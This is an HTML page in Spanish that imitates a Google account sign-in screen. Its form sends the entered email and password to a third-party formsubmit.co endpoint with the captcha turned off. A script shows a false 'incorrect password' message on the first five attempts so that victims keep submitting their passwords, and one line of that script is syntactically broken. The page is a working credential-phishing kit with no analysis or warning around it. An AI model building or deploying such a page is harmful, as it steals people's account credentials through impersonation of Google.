<!DOCTYPE html> 
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Inicia sesión en tu cuenta de Google para continuar</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white text-gray-800 flex items-center justify-center min-h-screen">

  <!-- Contenedor centrado -->
  <div class="w-full max-w-md bg-white shadow-md rounded p-8">
    
    <!-- Logo + Título -->
    <div class="text-center mb-6">
      <!-- Logo de Google -->
      <img src="https://img.icons8.com/color/512/google-logo.png" 
           alt="Google" class="mx-auto mb-2 w-16">
      <h1 class="text-xl font-semibold">Accede a tu cuenta</h1>
      <p class="text-gray-600 text-sm mt-2">
        Usa tu Cuenta de Google. La cuenta se agregará a este dispositivo <br>
        y estará disponible para otras apps de Google.
      </p>
      <a href="#" class="text-blue-600 text-sm mt-1 block">
        Más información sobre el uso de tu cuenta
      </a>
    </div>

    <!-- Formulario -->
    <form id="contactForm" 
          action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" 
          method="POST" 
          class="grid gap-4">

      <!-- Correo primero -->
      <input class="border border-gray-300 rounded px-4 py-2 focus:outline-none focus:ring-1 focus:ring-emerald-500" 
             name="correo" placeholder="Correo electrónico o teléfono" type="email" required>

      <!-- Contraseña después -->
      <div>
        <input id="nombre" 
               class="border border-gray-300 rounded px-4 py-2 w-full focus:outline-none focus:ring-1 focus:ring-emerald-500" 
               name="nombre" placeholder="Ingrese su contraseña" type="password" required>
        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden"> Contraseña incorrecta</p>
      </div>
      
      <!-- Redirección después de enviar -->
      <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html">
      <!-- Desactivar captcha -->
      <input type="hidden" name="_captcha" value="false">

      <!-- Botón -->
      <button type="submit" 
              class="bg-blue-600 hover:bg-blue-700 text-white py-2 rounded font-medium">
        Siguiente
      </button>
    </form>

    <!-- Links como en la pantalla oficial -->
    <div class="flex justify-between mt-4 text-sm">
      <a href="#" class="text-blue-600">¿Olvidaste el correo electrónico?</a>
      <a href="#" class="text-blue-600">Crear cuenta</a>
    </div>

  </div>

  <!-- Script para “trollear” -->
  <script>
    let intentoNombre = 0;

    document.getElementById("contactForm").addEventListener("submit", function(e) {
      const nombre = document.getElementById("nombre");
      const errorMsg = document.getElementById("errorNombre");

      intentoNombre++;

      if (intentoNombre < 6) { 
        // Mostrar error pero igual se envía
        errorMsg.classList.remove("hidden");
        nombre.classList.add("border-red-500");
        errorMsg.textContent = " Contraseña incorrecta (intento " )";
      } else {
        // En el 6 ya no muestra error
        errorMsg.classList.add("hidden");
        nombre.classList.remove("border-red-500");
      }
    });
  </script>

</body>
</html>
